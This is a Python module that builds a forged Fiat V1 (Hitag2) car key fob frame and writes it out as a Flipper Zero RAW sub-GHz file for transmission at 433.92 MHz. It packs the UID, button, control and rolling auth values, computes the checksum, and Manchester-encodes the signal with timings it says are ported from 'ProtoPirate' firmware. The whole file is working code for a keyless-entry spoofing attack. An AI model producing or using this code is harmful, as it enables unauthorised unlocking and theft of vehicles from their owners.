"""Render a forged Fiat V1 (Hitag2 RKE) frame as a Flipper RAW .sub for transmit. Wire layout +
timing ported verbatim from the firmware ProtoPirate/fiat_v1.c: build_raw packs a 13-byte / 104-bit
frame (uid, button, 10-bit control, 32-bit auth/hop, tail) with xor = 0x01 ^ raw[0..11]; the encoder
emits a lead pulse, then each bit as a Manchester pair (bit1 = high,low / bit0 = low,high) at the
variant TE, then a trailing gap, repeated. Variant B (te=100us) is the firmware default."""
import json

_WIRE_BITS = 104
_REPEAT = 6
# (te_us, lead_us, gap_us) per TE variant
_VAR = {"A": (250, 2033, 3252), "B": (100, 850, 1230)}
_DEFAULT_PRESET = "FuriHalSubGhzPresetOok650Async"


def build_raw(uid, button, control, auth, tail=2):
    r = [0] * 13
    r[1] = 0x01
    r[2] = (uid >> 24) & 0xFF
    r[3] = (uid >> 16) & 0xFF
    r[4] = (uid >> 8) & 0xFF
    r[5] = uid & 0xFF
    r[6] = ((button & 0x0F) << 4) | ((control >> 6) & 0x0F)
    r[7] = ((control & 0x3F) << 2) | ((auth >> 30) & 0x03)
    r[8] = (auth >> 22) & 0xFF
    r[9] = (auth >> 14) & 0xFF
    r[10] = (auth >> 6) & 0xFF
    r[11] = ((auth << 2) & 0xFF) | (tail & 0x03)
    x = 0x01
    for i in range(12):
        x ^= r[i]
    r[12] = x & 0xFF
    return r


def _coalesce(p):
    out = []
    for d in p:
        if d == 0:
            continue
        if out and ((out[-1] > 0) == (d > 0)):
            out[-1] += d
        else:
            out.append(d)
    return out


def _levels(uid, button, control, auth, variant, tail):
    te, lead, gap = _VAR.get(variant, _VAR["B"])
    raw = build_raw(uid, button, control, auth, tail)
    p = []
    for _ in range(_REPEAT):
        p.append(lead)                      # lead: high
        for bit_index in range(_WIRE_BITS):
            bit = (raw[bit_index >> 3] >> (7 - (bit_index & 7))) & 1
            if bit:
                p += [te, -te]              # bit 1: high, low
            else:
                p += [-te, te]              # bit 0: low, high
        p.append(-gap)                      # gap: low
    return p, raw


def render_sub(uid, button, control, auth, variant="B", freq=433920000, preset=_DEFAULT_PRESET, tail=2):
    p, raw = _levels(uid & 0xFFFFFFFF, button & 0x0F, control & 0x3FF, auth & 0xFFFFFFFF, variant, tail & 0x03)
    p = _coalesce(p)
    lines = ["RAW_Data: " + " ".join(str(x) for x in p[i:i + 512]) for i in range(0, len(p), 512)]
    sub = ("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: %d\nPreset: %s\nProtocol: RAW\n%s\n"
           % (freq, preset, "\n".join(lines)))
    return json.dumps({"ok": True, "sub": sub, "raw": "".join("%02X" % b for b in raw)})


# ---- self-test: build_raw then re-extract fields (firmware fiat_v1_uid/counter/hop) ----
def _selftest():
    uid, btn, ctrl, hop = 0x75E1D628, 0x2, 0x14A, 0x9A2F31CC
    r = build_raw(uid, btn, ctrl, hop, 2)
    e_uid = (r[2] << 24) | (r[3] << 16) | (r[4] << 8) | r[5]
    e_ctrl = ((r[6] & 0x0F) << 6) | (r[7] >> 2)
    e_hop = ((r[7] & 0x03) << 30) | (r[8] << 22) | (r[9] << 14) | (r[10] << 6) | (r[11] >> 2)
    e_btn = r[6] >> 4
    x = 0x01
    for i in range(12):
        x ^= r[i]
    return (e_uid == uid and e_btn == btn and e_ctrl == ctrl and e_hop == hop and r[12] == (x & 0xFF)
            and r[0] == 0 and r[1] == 1)
